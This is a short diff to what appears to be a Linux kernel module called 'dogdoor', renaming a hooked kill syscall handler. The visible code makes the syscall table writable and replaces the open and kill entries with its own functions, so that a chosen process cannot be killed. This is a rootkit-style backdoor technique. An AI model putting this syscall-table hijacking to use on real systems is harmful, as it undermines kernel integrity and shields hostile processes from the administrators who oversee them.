@@ -35,7 +35,7 @@ char *listOF[10] = {of0, of2, of3, of4, of5, of6,of7,of8, of9};
 
 asmlinkage int (*orig_sys_kill)(pid_t pid, int sig) ;
 
-asmlinkage int openhook_sys_kill(pid_t pid, int sig)
+asmlinkage int dogdoor_sys_kill(pid_t pid, int sig)
 {
         if(pid == processID)
                 return -1 ;
@@ -155,7 +155,7 @@ int __init dogdoor_init(void) {
         if (pte->pte &~ _PAGE_RW) 
                 pte->pte |= _PAGE_RW ;          
         sctable[__NR_open] = dogdoor_sys_open ;
-        sctable[__NR_kill] = openhook_sys_kill ;
+        sctable[__NR_kill] = dogdoor_sys_kill ;
 
         return 0;
 }
